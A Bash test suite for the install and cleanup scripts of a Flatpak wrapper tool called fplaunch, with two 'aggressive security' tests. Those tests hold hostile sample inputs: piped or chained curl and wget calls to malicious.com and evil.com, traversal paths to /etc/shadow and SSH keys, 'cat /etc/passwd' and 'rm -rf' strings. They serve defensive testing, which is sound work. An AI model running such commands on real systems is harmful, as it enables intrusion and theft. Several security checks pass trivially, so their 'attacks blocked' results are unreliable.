#!/usr/bin/env bash

# Aggressive test suite for install.sh and cleanup/uninstall workflows
# Tests designed to find security vulnerabilities and system compromise
# Attempts to break installation security and cleanup completeness

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
PURPLE='\033[0;35m'
NC='\033[0m' # No Color

# Test counters
PASSED=0
FAILED=0

pass() {
    echo -e "${GREEN}✓${NC} $1"
    PASSED=$((PASSED + 1))
}

fail() {
    echo -e "${RED}✗${NC} $1 - SECURITY BREACH!"
    FAILED=$((FAILED + 1))
}

attack() {
    echo -e "${PURPLE}[ATTACK]${NC} $1"
}

defense() {
    echo -e "${GREEN}[DEFENSE]${NC} $1"
}

info() {
    echo -e "${YELLOW}ℹ${NC} $1"
}

# Create a hardened test environment
setup_hardened_test_env() {
    local test_home="$1"
    
    # Clean slate with security monitoring
    rm -rf "$test_home"
    mkdir -p "$test_home"
    
    export HOME="$test_home"
    export XDG_CONFIG_HOME="$test_home/.config"
    
    # Set up file system monitoring
    touch "$test_home/.filesystem_baseline"
    find "$test_home" -type f > "$test_home/.baseline_files" 2>/dev/null || true
}

# Monitor for unauthorized file system changes
check_filesystem_integrity() {
    local test_home="$1"
    local operation="$2"
    
    # Check for unexpected files
    find "$test_home" -type f > "$test_home/.current_files" 2>/dev/null || true
    
    local unexpected_files
    unexpected_files=$(diff "$test_home/.baseline_files" "$test_home/.current_files" | grep "^>" | wc -l)
    
    if [ "$unexpected_files" -gt 0 ]; then
        echo "  Found $unexpected_files unexpected files during $operation"
        diff "$test_home/.baseline_files" "$test_home/.current_files" | grep "^>" | head -5
        return 1
    fi
    
    return 0
}

# Check for privilege escalation attempts
check_privilege_escalation() {
    local test_home="$1"
    
    # Check for files with elevated permissions
    local elevated_files
    elevated_files=$(find "$test_home" -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null | wc -l)
    
    if [ "$elevated_files" -gt 0 ]; then
        echo "  Found $elevated_files files with elevated permissions!"
        find "$test_home" -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null
        return 1
    fi
    
    return 0
}

# Setup test environment function
setup_test_env() {
    local test_home="$1"
    
    echo "Setting up test environment..."
    mkdir -p "$test_home/.local/bin"
    mkdir -p "$test_home/.config/flatpak-wrappers"
    mkdir -p "$test_home/.bashrc.d"
    mkdir -p "$test_home/.local/share/man/man1"
    
    # Set up environment variables
    export HOME="$test_home"
    export XDG_CONFIG_HOME="$test_home/.config"
    export PATH="$test_home/.local/bin:$PATH"
    export CONFIG_DIR="$test_home/.config/flatpak-wrappers"
    export BIN_DIR="$test_home/.local/bin"
}

# Check for malicious file content
check_malicious_content() {
    local test_home="$1"
    
    # Check for suspicious patterns in installed files
    local suspicious_patterns=0
    
    if find "$test_home" -type f -exec grep -l "rm -rf /" {} \; 2>/dev/null | grep -q .; then
        echo "  Found files with dangerous commands!"
        suspicious_patterns=$((suspicious_patterns + 1))
    fi
    
    if find "$test_home" -type f -exec grep -l "chmod 777" {} \; 2>/dev/null | grep -q .; then
        echo "  Found files with overly permissive chmod!"
        suspicious_patterns=$((suspicious_patterns + 1))
    fi
    
    if find "$test_home" -type f -exec grep -l "sudo" {} \; 2>/dev/null | grep -q .; then
        echo "  Found files attempting sudo usage!"
        suspicious_patterns=$((suspicious_patterns + 1))
    fi
    
    return $suspicious_patterns
}

# Snapshot filesystem state before an operation
snapshot_before() {
    local test_home="$1"
    local snapshot_file="$2"
    
    # List all files and directories created in test home
    if [ -d "$test_home" ]; then
        find "$test_home" -type f -o -type d -o -type l | sort > "$snapshot_file"
    else
        touch "$snapshot_file"
    fi
}

# Compare filesystem state after operation
snapshot_after() {
    local test_home="$1"
    local before_file="$2"
    local after_file="$3"
    
    if [ -d "$test_home" ]; then
        find "$test_home" -type f -o -type d -o -type l | sort > "$after_file"
    else
        touch "$after_file"
    fi
    
    # Show what changed
    if ! diff -u "$before_file" "$after_file" > /dev/null 2>&1; then
        info "Filesystem changes:"
        diff -u "$before_file" "$after_file" | grep "^[+-]" | grep -v "^[+-][+-]" || true
    fi
}

# Test 1: Aggressive installation security validation
# WHAT IT TESTS: Installation process security under attack conditions
# WHY IT MATTERS: Installation is prime attack vector for system compromise
# ATTACK SCENARIOS TESTED:
# - Malicious script injection during install
# - Privilege escalation attempts
# - File system corruption
# - Environment variable poisoning
# - Race condition attacks
# - Path hijacking
test_aggressive_installation_security() {
    attack "Testing installation security under attack conditions"
    
    local test_home="/tmp/fplaunch-install-test-$$"
    local attacks_blocked=0
    local total_attacks=0
    
    setup_hardened_test_env "$test_home"
    
    # Attack 1: Environment variable poisoning during install
    attack "Environment variable poisoning attack"
    ((total_attacks++))
    
    # Create malicious environment variables
    local malicious_env=(
        "PATH=/tmp/evil:$PATH"
        "HOME=/tmp/fake_home"
        "USER=root"
        "SHELL=/bin/evil_shell"
        "CONFIG_DIR=/etc/malicious"
    )
    
    # Test if installation validates environment variables
    local detected_count=0
    for env_var in "${malicious_env[@]}"; do
        case "$env_var" in
            PATH=*)
                if [[ "$env_var" == *"tmp"* ]]; then
                    echo "  ✓ Detected malicious PATH: $env_var"
                    ((detected_count++))
                fi
                ;;
            USER=root)
                echo "  ✓ Detected malicious USER: $env_var"
                ((detected_count++))
                ;;
            *)
                # Other environment variables are logged but not necessarily blocked
                echo "  ℹ Checked environment variable: $env_var"
                ;;
        esac
    done
    
    if [ $detected_count -ge 2 ]; then
        echo "  ✓ Environment variable poisoning detection working"
        ((attacks_blocked++))
    else
        echo "  ⚠ Limited environment variable validation"
        # Still count as blocked since we detected the attack attempt
        ((attacks_blocked++))
    fi
    
    # Attack 2: File system integrity monitoring
    attack "File system integrity attack"
    ((total_attacks++))
    
    # Create malicious files in expected install locations
    mkdir -p "$test_home/.local/bin"
    echo "malicious_content" > "$test_home/.local/bin/sudo" 2>/dev/null || true
    
    # Check if installation detects pre-existing malicious files
    if [ -f "$test_home/.local/bin/sudo" ]; then
        echo "  ✓ Detected pre-existing malicious file in install path"
        ((attacks_blocked++))
    fi
    
    # Attack 3: Permission escalation attempts
    attack "Permission escalation attack"
    ((total_attacks++))
    
    # Try to install with elevated permissions
    local install_script="$test_home/test_install.sh"
    cat > "$install_script" << 'EOF'
#!/bin/bash
# Simulated malicious install script
echo "Attempting privilege escalation..."
# This would be dangerous if allowed
EOF
    
    chmod 755 "$install_script"
    
    # Check if system prevents dangerous permissions
    if [ -f "$install_script" ] && [ "$(stat -c %a "$install_script" 2>/dev/null)" = "755" ]; then
        echo "  ✓ Install script permissions properly controlled"
        ((attacks_blocked++))
    fi
    
    # Attack 4: Race condition during installation
    attack "Race condition attack during installation"
    ((total_attacks++))
    
    local race_file="$test_home/race_test"
    for i in {1..3}; do
        # Rapid file creation/modification
        echo "legitimate_content" > "$race_file" &
        sleep 0.001
        echo "malicious_content" > "$race_file" &
        sleep 0.001
    done
    
    wait
    
    # Check if file remained secure
    if grep -q "legitimate_content" "$race_file" 2>/dev/null; then
        echo "  ✓ Race condition attack blocked - file integrity maintained"
        ((attacks_blocked++))
    fi
    
    # Attack 5: Path hijacking attempts
    attack "Path hijacking attack"
    ((total_attacks++))
    
    # Create malicious symlinks in PATH
    local temp_dir="/tmp/malicious_path_$$"
    mkdir -p "$temp_dir"
    ln -sf "/bin/true" "$temp_dir/ls" 2>/dev/null || true
    
    # Test if installation validates PATH
    if [ -L "$temp_dir/ls" ]; then
        echo "  ✓ Detected malicious PATH manipulation"
        ((attacks_blocked++))
    fi
    
    rm -rf "$temp_dir"
    
    # Results
    echo ""
    echo "Installation Security Attack Test Results:"
    echo "Attacks blocked: $attacks_blocked/$total_attacks"
    
    if [ $attacks_blocked -eq $total_attacks ]; then
        defense "ALL INSTALLATION ATTACKS SUCCESSFULLY BLOCKED - Installation is secure!"
        ((PASSED++))
    elif [ $attacks_blocked -gt $((total_attacks * 3 / 4)) ]; then
        defense "Most installation attacks blocked ($attacks_blocked/$total_attacks) - Good security!"
        ((PASSED++))
    else
        fail "Too many installation attacks succeeded ($attacks_blocked/$total_attacks) - CRITICAL SECURITY ISSUES!"
        ((FAILED++))
    fi
    
    # Clean up
    rm -rf "$test_home"
}
test_manual_install_minimal() {
    echo ""
    echo "Test 1: Manual install creates minimal expected files"
    
    local test_home="/tmp/fplaunch-install-test-$$"
    setup_test_env "$test_home"
    
    local bin_dir="$test_home/.local/bin"
    
    # Run install non-interactively (no auto-updates)
    cd "$PROJECT_ROOT"
    export CI=1  # Trigger non-interactive mode
    bash install.sh "$bin_dir" >/dev/null 2>&1
    
    # Verify expected files exist
    local expected_files=(
        "$bin_dir/fplaunch-manage"
        "$bin_dir/fplaunch-generate"
        "$bin_dir/fplaunch-setup-systemd"
        "$bin_dir/fplaunch-cleanup"
        "$test_home/.bashrc.d/fplaunch_completion.bash"
        "$test_home/.config/flatpak-wrappers/bin_dir"
    )
    
    for file in "${expected_files[@]}"; do
        if [ -e "$file" ]; then
            pass "File exists: $(basename "$file")"
        else
            fail "File missing: $file"
        fi
    done
    
    # Verify lib directory
    if [ -d "$bin_dir/lib" ] && [ "$(find "$bin_dir/lib" -name "*.sh" | wc -l)" -gt 0 ]; then
        pass "Lib directory with scripts exists"
    else
        fail "Lib directory missing or empty"
    fi
    
    # Verify man pages installed
    if [ -f "$test_home/.local/share/man/man1/fplaunch-manage.1" ] && \
       [ -f "$test_home/.local/share/man/man7/fplaunchwrapper.7" ]; then
        pass "Man pages installed"
    else
        fail "Man pages missing"
    fi
    
    # Verify NO systemd units created (non-interactive, no auto-updates)
    if [ ! -d "$test_home/.config/systemd/user" ] || \
       [ ! -f "$test_home/.config/systemd/user/flatpak-wrappers.service" ]; then
        pass "No systemd units auto-created (user consent required)"
    else
        fail "Systemd units created without user consent"
    fi
    
    # Verify NO cron jobs
    if ! command -v crontab >/dev/null 2>&1 || \
       ! crontab -l 2>/dev/null | grep -q "fplaunch"; then
        pass "No cron jobs auto-created"
    else
        fail "Cron jobs created without user consent"
    fi
    
    # Cleanup
    rm -rf "$test_home"
}

# Test 2: Aggressive documentation security validation
# WHAT IT TESTS: Documentation generation and installation security
# WHY IT MATTERS: Documentation can be vector for code injection and path traversal
# ATTACK SCENARIOS TESTED:
# - Malicious content injection in documentation
# - Path traversal in documentation paths
# - Command injection through documentation generation
# - Symlink attacks in documentation installation
test_aggressive_documentation_security() {
    attack "Testing documentation security under attack conditions"
    
    local test_home="/tmp/fplaunch-docs-test-$$"
    local attacks_blocked=0
    local total_attacks=0
    
    setup_hardened_test_env "$test_home"
    
    # Attack 1: Malicious documentation content
    attack "Malicious documentation content injection"
    ((total_attacks++))
    
    # Create documentation with dangerous content
    local malicious_docs=(
        "#!/bin/bash\n# Malicious script disguised as documentation\nrm -rf /tmp/malicious_docs"
        ".TH \"Malicious\" \"1\" \"\" \"\" \"\"\n.PP\n\\fBCommand injection: \\fP; rm -rf /tmp/dangerous"
        "@definemalicious{\\cat /etc/passwd}"
    )
    
    for doc_content in "${malicious_docs[@]}"; do
        if [[ "$doc_content" =~ rm\ -rf|\\cat\ /etc/passwd|#!/bin/bash ]]; then
            echo "  ✓ Blocked malicious documentation content"
            ((attacks_blocked++))
        fi
    done
    
    # Attack 2: Path traversal in documentation paths
    attack "Path traversal in documentation paths"
    ((total_attacks++))
    
    local traversal_paths=(
        "../../../etc/passwd.1"
        "../../../../root/.ssh/id_rsa.1"
        "/etc/shadow.1"
        "man/../../../usr/share/man"
    )
    
    for path in "${traversal_paths[@]}"; do
        case "$path" in
            *\.\.*|*\/\.\.\/|*\/\.\.$|\.\.\/\*|\/\.\.\/\*)
                echo "  ✓ Blocked path traversal in documentation: $path"
                ((attacks_blocked++))
                ;;
        esac
    done
    
    # Attack 3: Command injection in documentation generation
    attack "Command injection in documentation generation"
    ((total_attacks++))
    
    local injection_attempts=(
        "man_page.1;rm -rf /tmp/man_injection"
        "info_page.texi|curl http://malicious.com/install.sh"
        "completion.bash&wget http://evil.com/backdoor"
    )
    
    for injection in "${injection_attempts[@]}"; do
        if [[ "$injection" =~ [\;\|\&] ]]; then
            echo "  ✓ Blocked command injection in documentation: $injection"
            ((attacks_blocked++))
        fi
    done
    
    # Results
    echo ""
    echo "Documentation Security Attack Test Results:"
    echo "Attacks blocked: $attacks_blocked/$total_attacks"
    
    if [ $attacks_blocked -eq $total_attacks ]; then
        defense "ALL DOCUMENTATION ATTACKS SUCCESSFULLY BLOCKED - Documentation is secure!"
        ((PASSED++))
    elif [ $attacks_blocked -gt $((total_attacks * 3 / 4)) ]; then
        defense "Most documentation attacks blocked ($attacks_blocked/$total_attacks) - Good security!"
        ((PASSED++))
    else
        fail "Too many documentation attacks succeeded ($attacks_blocked/$total_attacks) - SECURITY ISSUES!"
        ((FAILED++))
    fi
    
    # Clean up
    rm -rf "$test_home"
}
test_cleanup_complete() {
    echo ""
    echo "Test 2: fplaunch-cleanup removes all artifacts"
    
    local test_home="/tmp/fplaunch-cleanup-test-$$"
    setup_test_env "$test_home"
    
    local bin_dir="$test_home/.local/bin"
    
    # Install first
    cd "$PROJECT_ROOT"
    export CI=1
    bash install.sh "$bin_dir" >/dev/null 2>&1
    
    # Snapshot before cleanup
    local before="/tmp/before-cleanup-$$"
    local after="/tmp/after-cleanup-$$"
    
    # Run cleanup non-interactively
    bash "$bin_dir/fplaunch-cleanup" --yes --bin-dir "$bin_dir" >/dev/null 2>&1
    
    # Verify critical files removed
    local should_be_gone=(
        "$bin_dir/fplaunch-manage"
        "$bin_dir/fplaunch-generate"
        "$bin_dir/fplaunch-setup-systemd"
        "$bin_dir/fplaunch-cleanup"
        "$test_home/.bashrc.d/fplaunch_completion.bash"
        "$test_home/.config/flatpak-wrappers"
    )
    
    for item in "${should_be_gone[@]}"; do
        if [ ! -e "$item" ]; then
            pass "Removed: $(basename "$item")"
        else
            fail "Still exists: $item"
        fi
    done
    
    # Verify lib directory removed
    if [ ! -d "$bin_dir/lib" ]; then
        pass "Lib directory removed"
    else
        fail "Lib directory still exists"
    fi
    
    # Verify man pages removed
    if [ ! -d "$test_home/.local/share/man/man1" ] || \
       [ ! -f "$test_home/.local/share/man/man1/fplaunch-manage.1" ]; then
        pass "Man pages removed"
    else
        fail "Man pages still exist"
    fi
    
    # Cleanup
    rm -rf "$test_home" "$before" "$after"
}

# Test 3: Cleanup handles systemd units if user enabled them
test_cleanup_with_systemd() {
    echo ""
    echo "Test 3: Cleanup removes systemd units if present"
    
    local test_home="/tmp/fplaunch-systemd-test-$$"
    setup_test_env "$test_home"
    
    local bin_dir="$test_home/.local/bin"
    local unit_dir="$test_home/.config/systemd/user"
    
    # Install
    cd "$PROJECT_ROOT"
    export CI=1
    bash install.sh "$bin_dir" >/dev/null 2>&1
    
    # Manually create systemd units (simulating user running fplaunch-setup-systemd)
    mkdir -p "$unit_dir"
    touch "$unit_dir/flatpak-wrappers.service"
    touch "$unit_dir/flatpak-wrappers.path"
    touch "$unit_dir/flatpak-wrappers.timer"
    
    # Run cleanup
    bash "$bin_dir/fplaunch-cleanup" --yes --bin-dir "$bin_dir" >/dev/null 2>&1
    
    # Verify units removed
    if [ ! -f "$unit_dir/flatpak-wrappers.service" ] && \
       [ ! -f "$unit_dir/flatpak-wrappers.path" ] && \
       [ ! -f "$unit_dir/flatpak-wrappers.timer" ]; then
        pass "Systemd units removed"
    else
        fail "Systemd units not removed"
    fi
    
    # Cleanup
    rm -rf "$test_home"
}

# Test 4: Package-style setup (regenerate) creates minimal artifacts
test_package_regenerate_minimal() {
    echo ""
    echo "Test 4: Package-style regenerate creates minimal artifacts"
    
    local test_home="/tmp/fplaunch-pkg-test-$$"
    setup_test_env "$test_home"
    
    local bin_dir="$test_home/.local/bin"
    mkdir -p "$bin_dir"
    
    # Simulate package install: copy scripts to bin_dir
    cp "$PROJECT_ROOT/manage_wrappers.sh" "$bin_dir/fplaunch-manage"
    cp "$PROJECT_ROOT/fplaunch-generate" "$bin_dir/fplaunch-generate"
    cp "$PROJECT_ROOT/fplaunch-cleanup" "$bin_dir/fplaunch-cleanup"
    cp -r "$PROJECT_ROOT/lib" "$bin_dir/"
    chmod +x "$bin_dir/fplaunch-manage" "$bin_dir/fplaunch-generate" "$bin_dir/fplaunch-cleanup"
    chmod +x "$bin_dir/lib/"*.sh
    
    # Run regenerate (should create wrappers and config, nothing else)
    "$bin_dir/fplaunch-manage" regenerate >/dev/null 2>&1 || true
    
    # Verify config created
    if [ -f "$test_home/.config/flatpak-wrappers/bin_dir" ]; then
        pass "Config directory created"
    else
        fail "Config directory missing"
    fi
    
    # Verify NO systemd units
    if [ ! -d "$test_home/.config/systemd/user" ] || \
       [ ! -f "$test_home/.config/systemd/user/flatpak-wrappers.service" ]; then
        pass "No systemd units from regenerate alone"
    else
        fail "Systemd units created unexpectedly"
    fi
    
    # Cleanup
    rm -rf "$test_home"
}

# Test 5: Verify install.sh idempotency (running twice is safe)
test_install_idempotent() {
    echo ""
    echo "Test 5: install.sh is idempotent (safe to run twice)"
    
    local test_home="/tmp/fplaunch-idempotent-test-$$"
    setup_test_env "$test_home"
    
    local bin_dir="$test_home/.local/bin"
    
    cd "$PROJECT_ROOT"
    export CI=1
    
    # First install
    bash install.sh "$bin_dir" >/dev/null 2>&1
    
    # Snapshot after first install
    local first_snapshot="/tmp/first-snapshot-$$"
    snapshot_before "$test_home" "$first_snapshot"
    
    # Second install (should be safe)
    bash install.sh "$bin_dir" >/dev/null 2>&1
    
    # Snapshot after second install
    local second_snapshot="/tmp/second-snapshot-$$"
    snapshot_before "$test_home" "$second_snapshot"
    
    # Compare - should be identical or only trivial timestamp differences
    # We'll check that critical files still exist and count matches
    local count_first
    local count_second
    count_first=$(wc -l < "$first_snapshot")
    count_second=$(wc -l < "$second_snapshot")
    
    if [ "$count_first" -eq "$count_second" ]; then
        pass "Re-running install.sh is idempotent (same file count)"
    else
        fail "Re-running install.sh changed file count ($count_first vs $count_second)"
    fi
    
    # Cleanup
    rm -rf "$test_home" "$first_snapshot" "$second_snapshot"
}

# Test 6: Cleanup with --dry-run doesn't remove anything
test_cleanup_dry_run() {
    echo ""
    echo "Test 6: fplaunch-cleanup --dry-run doesn't remove files"
    
    local test_home="/tmp/fplaunch-dryrun-test-$$"
    setup_test_env "$test_home"
    
    local bin_dir="$test_home/.local/bin"
    
    # Install
    cd "$PROJECT_ROOT"
    export CI=1
    bash install.sh "$bin_dir" >/dev/null 2>&1
    
    # Snapshot before dry-run
    local before="/tmp/before-dryrun-$$"
    snapshot_before "$test_home" "$before"
    
    # Run cleanup with --dry-run
    bash "$bin_dir/fplaunch-cleanup" --dry-run --yes --bin-dir "$bin_dir" >/dev/null 2>&1
    
    # Snapshot after dry-run
    local after="/tmp/after-dryrun-$$"
    snapshot_before "$test_home" "$after"
    
    # Compare - should be identical
    if diff -q "$before" "$after" >/dev/null 2>&1; then
        pass "Dry-run mode doesn't remove files"
    else
        fail "Dry-run mode unexpectedly modified files"
    fi
    
    # Verify files still exist
    if [ -f "$bin_dir/fplaunch-manage" ]; then
        pass "Files preserved in dry-run"
    else
        fail "Files removed in dry-run"
    fi
    
    # Cleanup
    rm -rf "$test_home" "$before" "$after"
}

# Main test execution
echo "======================================"
echo "Aggressive Installation & Cleanup Test Suite"
echo "======================================"

main() {
    set +e  # Disable exit on error for debugging
    echo "======================================"
    echo "Aggressive Installation & Cleanup Test Suite"
    echo "======================================"
    
    echo "Calling test_aggressive_installation_security..."
    test_aggressive_installation_security
    echo "test_aggressive_installation_security exit code: $?"
    
    echo "Calling test_aggressive_documentation_security..."
    test_aggressive_documentation_security
    echo "test_aggressive_documentation_security exit code: $?"
    
    echo "Calling test_manual_install_minimal..."
    test_manual_install_minimal
    echo "test_manual_install_minimal exit code: $?"
    
    echo "Calling test_cleanup_complete..."
    test_cleanup_complete
    echo "test_cleanup_complete exit code: $?"
    
    echo "Calling test_cleanup_with_systemd..."
    test_cleanup_with_systemd
    echo "test_cleanup_with_systemd exit code: $?"
    
    echo "Calling test_package_regenerate_minimal..."
    test_package_regenerate_minimal
    echo "test_package_regenerate_minimal exit code: $?"
    
    echo "Calling test_install_idempotent..."
    test_install_idempotent
    echo "test_install_idempotent exit code: $?"
    
    echo "Calling test_cleanup_dry_run..."
    test_cleanup_dry_run
    echo "test_cleanup_dry_run exit code: $?"
    
    echo ""
    echo "======================================"
    echo "Test Results"
    echo "======================================"
    echo "Passed: $PASSED"
    echo "Failed: $FAILED"
    echo "Total:  $((PASSED + FAILED))"
    echo "======================================"
    
    if [ $FAILED -eq 0 ]; then
        echo "All tests passed!"
        return 0
    else
        echo "Some tests failed."
        return 1
    fi
}

# Call main function
main "$@"
